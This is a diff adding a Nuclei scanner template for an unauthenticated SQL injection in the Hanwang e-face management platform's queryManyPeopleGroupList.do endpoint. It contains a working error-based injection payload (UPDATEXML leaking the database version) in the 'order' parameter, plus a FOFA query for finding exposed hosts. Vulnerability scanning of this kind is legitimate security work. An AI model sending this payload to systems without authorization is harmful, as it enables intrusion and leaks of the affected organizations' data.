@@ -1,0 +1,30 @@
+id: hanwang-querymanypeople-sqli
+
+info:
+  name: Hanwang QueryManyPeopleGroupList SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    汉王e脸通综合管理平台的 queryManyPeopleGroupList.do 接口存在 SQL 注入漏洞。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。
+  reference:
+    - https://github.com/wooluo/nuclei-templates-2025hw/blob/2a9916e7dd3609737956777fcf4cfb399a40ac7c/hanwang-querymanypeople-sqli.yaml
+  metadata:
+    fofa-query: icon_hash="1380907357"
+    verified: true
+  tags: 汉王e脸通综合管理平台
+
+http:
+  - raw:
+      - |
+        GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+        part: body
+      - type: status
+        status:
+          - 200
